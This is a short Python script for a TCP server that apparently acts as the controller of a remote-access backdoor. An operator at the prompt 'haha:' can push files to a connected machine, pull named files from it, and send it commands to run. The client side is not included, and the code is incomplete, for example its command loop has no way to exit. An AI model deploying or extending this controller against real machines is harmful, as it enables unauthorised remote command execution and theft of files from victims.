import socket
import threading

HEADER = 64
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = '!disconnect'

PORT = 1234
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind(ADDR)

def send_file(conn):
    print('sending')
    file_name = input('Enter file name : ')
    conn.send(file_name.encode())

    file = open(file_name, 'rb')
    f = file.read()
    conn.send(f)
    file.close()

def recv_file(conn):
    file_name = input('Enter file name : ')
    conn.send(file_name.encode())
    print('reciving')
    file = conn.recv(1024).decode()
    f = open(str(file_name), 'wt')
    f.write(file)
    f.close()
    print(file)    

def cmd(conn):
    active = True
    while active:
        command = input('command prompt > ')
        conn.send(command.encode())

def handle_client(conn, addr):
    print(f"[NEW CONNECTION]  connected")
    connection = True
    while connection:
        massage = input('haha: ')
        conn.send(massage.encode())
        if massage == 'end':
            conn.close()
            connection = False
            break
        elif massage == 'send':
            send_file(conn)
        elif massage == 'recv':
            recv_file(conn)
        elif massage == 'cmd':
            cmd(conn)

        
def start():
    server.listen(5)
    print(f"[SERVER] server is running on {SERVER}")
    while True:
        conn, addr = server.accept()
        handle_client(conn, addr)
        print(f"[ACTIVE CONNECTIONS] {threading.activeCount() -1}")

start()